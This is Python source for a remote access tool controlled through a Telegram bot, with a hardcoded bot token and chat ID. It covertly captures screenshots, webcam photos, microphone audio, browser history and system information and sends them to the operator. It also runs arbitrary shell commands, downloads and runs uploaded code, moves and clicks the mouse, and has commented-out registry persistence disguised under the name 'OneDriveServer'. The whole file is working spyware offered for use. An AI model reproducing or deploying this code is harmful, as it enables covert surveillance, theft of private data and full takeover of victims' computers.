import telebot
from telebot import types


import cv2
from PIL import ImageGrab
import os
from browser_history import get_history
import pyaudio
import wave

import time
import pyautogui

#import winreg
# Путь к папке со скриптом
#script_path = os.path.abspath("main.py")
# Открываем ключ реестра
#key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
# Добавляем значение в ключ реестра
#winreg.SetValueEx(key, "OneDriveServer", 0, winreg.REG_SZ, script_path)
# Закрываем ключ реестра
#winreg.CloseKey(key)


bot = telebot.TeleBot("5377433922:AAG4QIoFIbtv587e4QJ9a7bo1AKtB4zxK6I")
ID: int = 886293441 #886293441 886293441 1110656480

bot.send_message(ID, "🟢ОНЛАЙН🟢")

@bot.message_handler(commands=['start', 'help'])
def start(message):
    if message.chat.id == ID:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Отримати скріншот екрану")
        btn2 = types.KeyboardButton("Відкрити командний рядок")
        btn3 = types.KeyboardButton("Команди pyautogui")
        btn4 = types.KeyboardButton("Запустити Python код")
        btn5 = types.KeyboardButton("Отримати фото з камери")
        btn6 = types.KeyboardButton("Отримати данні комп'ютера")
        btn7 = types.KeyboardButton("Отримати історію браузера")
        btn8 = types.KeyboardButton("Отримати звук з мікрофона")
        btn9 = types.KeyboardButton("Онлайн сервер")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
        bot.send_message(ID,
                         text="Привіт {0.first_name}! Я приватний бот удаленного доступа".format(
                             message.from_user), reply_markup=markup)

@bot.message_handler(content_types=['text', 'image', 'document'])
def func(message):
    if message.chat.id == ID:

###########################################################################

        if (message.text == "Отримати скріншот екрану"):
            screen = ImageGrab.grab()
            bot.send_message(ID, "Знімок з екрана:")
            bot.send_photo(ID, screen)

###########################################################################

        elif (message.text == "Отримати історію браузера"):
            outputs = get_history()
            outputs.save("C:\Windows\Temp\history.json")
            his = open('C:\Windows\Temp\history.json', 'rb')
            bot.send_message(ID, "Історія браузера для мелкого шалунишки")
            bot.send_document(ID, his)
            his.close()
            os.remove("C:\Windows\Temp\history.json")

###########################################################################

        elif (message.text == "Отримати звук з мікрофона"):
            reply_record = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("Скасування", callback_data="back1")
            reply_record.add(back1)
            send_message = bot.send_message(ID, "Введіть скільки секунд записувати",
                                            reply_markup=reply_record)
            bot.register_next_step_handler(send_message, record)


###########################################################################

        elif message.text == "Отримати фото з камери":
            cap = cv2.VideoCapture(0)
            for i in range(30):
                cap.read()
            ret, image = cap.read()
            path = 'C:\Windows\Temp'
            cv2.imwrite(os.path.join(path, 'cam.jpg'), image)
            cap.release()
            photo = open('C:\Windows\Temp\cam.jpg', 'rb')
            bot.send_message(ID, "Знімок з камери")
            bot.send_photo(ID, photo)
            photo.close()
            os.remove("C:\Windows\Temp\cam.jpg")


###########################################################################

        elif message.text == "Відкрити командний рядок":
            markup_cmd = types.ReplyKeyboardMarkup(resize_keyboard=True)
            btn_back1 = types.KeyboardButton("Скасування")
            markup_cmd.add(btn_back1)
            snd_message = bot.send_message(ID, "Введіть команду, яка виконається в командному рядку",
                                           reply_markup=markup_cmd)
            bot.register_next_step_handler(snd_message, open_cmd)

###########################################################################

        elif (message.text == "Команди pyautogui"):
            markup_command = types.ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = types.KeyboardButton("Пересунути курсор")
            btn2 = types.KeyboardButton("Натиснути на ліву клавішу миші")
            btn3 = types.KeyboardButton("Натиснути на праву клавішу миші")
            back_back = types.KeyboardButton("Назад")
            markup_command.add(btn1, btn2, btn3, back_back)
            bot.send_message(ID, text="Виберіть дію", reply_markup=markup_command)

###########################################################################

        elif message.text == "Запустити Python код":
            global start_cod
            start_cod = True
            start_markup = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("Скасування", callback_data="back3")
            start_markup.add(back1)
            send_message = bot.send_message(ID,
                                            "Надішліть код з розширенням .py",
                                            reply_markup=start_markup)
            bot.register_next_step_handler(send_message, start_code)

###########################################################################

        elif message.text == "Пересунути курсор":
            global move_cur

            move_cur = True
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("Скасування", callback_data="back1")
            reply_curcor.add(back1)
            send_message = bot.send_message(ID, "Введіть куди пересунути курсор (x, y) через кому. Приклад: 100,100:",
                                            reply_markup=reply_curcor)
            bot.register_next_step_handler(send_message, move_cursor)

###########################################################################

        elif message.text == "Натиснути на ліву клавішу миші":
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            clickl1 = types.InlineKeyboardButton("Натиснути 1 раз", callback_data="clickl1")
            clickl2 = types.InlineKeyboardButton("Натиснути 2 рази", callback_data="clickl2")
            back2 = types.InlineKeyboardButton("Скасування", callback_data="back2")
            reply_curcor.add(clickl1, clickl2, back2)
            bot.send_message(ID,
                             "Натисніть на кнопку",
                             reply_markup=reply_curcor)

###########################################################################

        elif message.text == "Натиснути на праву клавішу миші":
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            clickr1 = types.InlineKeyboardButton("Натиснути 1 раз", callback_data="clickr1")
            back2 = types.InlineKeyboardButton("Скасування", callback_data="back2")
            reply_curcor.add(clickr1, back2)
            bot.send_message(ID,
                             "Натисніть на кнопку",
                             reply_markup=reply_curcor)
###########################################################################

        elif message.text == "Отримати данні комп'ютера":
            bot.send_message(ID, text="Зачекайте будь-ласка пару секунд збираю данні для відправки".format(message.from_user))
            os.system("python pc_information.py")
            time.sleep(5)
            doc = open("C:\Windows\Temp\info.txt", "rb")
            bot.send_document(ID, doc)
            doc.close()
            os.remove("C:\Windows\Temp\info.txt")

###########################################################################

        elif message.text == "Онлайн сервер":
            bot.send_message(ID, "Зачекайте будь-ласка пару секунд, запускаю сервер")
            from serv import ngrok_url
            bot.send_message(ID, ngrok_url)


###########################################################################

        elif message.text == "Назад":
            start(message)

###########################################################################

@bot.callback_query_handler(lambda callback: callback.data)
def check(callback):
    if callback.data == "back1":
        global move_cur

        move_cur = False
        bot.delete_message(ID, callback.message.message_id)

###########################################################################

    elif callback.data == "clickl1":
        x, y = pyautogui.position()
        pyautogui.leftClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "Клавіша натиснута")

###########################################################################

    elif callback.data == "clickl2":
        x, y = pyautogui.position()
        pyautogui.leftClick(x, y)
        pyautogui.leftClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "Клавіша натиснута")

###########################################################################

    elif callback.data == "clickr1":
        x, y = pyautogui.position()
        pyautogui.rightClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "Клавіша натиснута")

###########################################################################

    elif callback.data == "back2":
        bot.delete_message(ID, callback.message.message_id)

###########################################################################

    elif callback.data == "back3":
        global start_cod

        start_cod = False
        bot.delete_message(ID, callback.message.message_id)

def open_cmd(message):
    if message.text == "Скасування":
        start(message)
    else:
        rez = os.system(message.text)

        if rez == 0:
            bot.send_message(ID, "Команда виконана успішно")
        else:
            bot.send_message(ID, "Увага! Помилка!")
        start(message)

def move_cursor(message):
    if move_cur:
        try:
            x, y = map(int, message.text.split(","))
            pyautogui.moveTo(x, y)
            bot.send_message(ID, "Курсор посунутий")
        except:
            bot.send_message(ID, "Помилка")
            message.text = "Пересунути курсор"
            func(message)
    else:
        func(message)

def start_code(message):
    if start_cod:
        file = bot.get_file(message.document.file_id)
        filename, file_extension = os.path.splitext(file.file_path)

        b = "qadrw" + file_extension

        save_photo = bot.download_file(file.file_path)

        with open(b, 'wb') as new_file:
            new_file.write(save_photo)

        bot.send_message(ID, f"Код прийнятий")
        os.startfile(b)
        bot.send_message(ID, f"Код запущений")
    else:
        func(message)

def record(message):
    if message.text == "Скасування":
        start(message)
    else:
        try:
            RECORD_SECONDS = int(message.text)
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            WAVE_OUTPUT_FILENAME = "C:\Windows\Temp/0.wav"

            p = pyaudio.PyAudio()



            stream = p.open(
                            format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK
                            )

            bot.send_message(ID, "Записую")
            print("* recording")

            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            bot.send_message(ID, "Записав")
            print("* done recording")

            stream.stop_stream()
            stream.close()
            p.terminate()

            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            bot.send_message(ID, "Відправляю")
            rec = open("C:\Windows\Temp/0.wav", "rb")
            bot.send_document(ID, rec)
            rec.close()
            os.remove("C:\Windows\Temp/0.wav")
        except:
            bot.send_message(ID, "Помилка увведіть тільки число")
            message.text = "Отримати звук з мікрофона"
            func(message)


bot.polling(none_stop=True)
bot.send_message(ID, "🔴ОФЛАЙН🔴")
